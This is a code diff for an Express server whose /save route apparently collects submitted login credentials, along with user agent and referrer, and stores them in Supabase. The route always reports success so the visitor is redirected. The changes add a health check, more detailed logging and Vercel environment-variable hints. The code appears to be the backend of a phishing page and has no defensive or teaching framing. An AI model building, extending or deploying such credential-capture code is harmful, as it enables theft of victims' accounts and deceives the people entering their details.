@@ -25,6 +25,16 @@ if (supabaseUrl && supabaseKey) {
 // Middleware to parse JSON
 app.use(express.json());
 
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.json({
+    status: 'ok',
+    supabase_configured: !!supabase,
+    supabase_url: supabaseUrl ? 'Set' : 'NOT SET',
+    supabase_key: supabaseKey ? 'Set' : 'NOT SET'
+  });
+});
+
 // Root route - serve index.html
 app.get('/', (req, res) => {
   try {
@@ -96,7 +106,6 @@ app.post('/save', async (req, res) => {
   const userAgent = req.get('User-Agent');
   const referrer = req.get('Referer');
 
-  // Log the attempt
   console.log('Save attempt for:', email, 'Supabase available:', !!supabase);
 
   // Try to save to database if configured
@@ -117,17 +126,20 @@ app.post('/save', async (req, res) => {
 
       if (error) {
         console.error('Supabase error:', error);
+        // Log but don't fail - still redirect
       } else {
-        console.log('Credentials saved successfully to Supabase');
+        console.log('Credentials saved successfully to Supabase', data);
       }
     } catch (error) {
       console.error('Exception saving to Supabase:', error.message);
+      // Log but don't fail - still redirect
     }
   } else {
-    console.log('Supabase not configured - credentials not saved to database');
+    console.warn('Supabase not configured - credentials cannot be saved to database');
+    console.warn('Please set SUPABASE_URL and SUPABASE_ANON_KEY environment variables on Vercel');
   }
 
-  // Always return success to trigger redirect
+  // Always return success and redirect
   res.json({ success: true, message: 'Credentials processed' });
 });
 
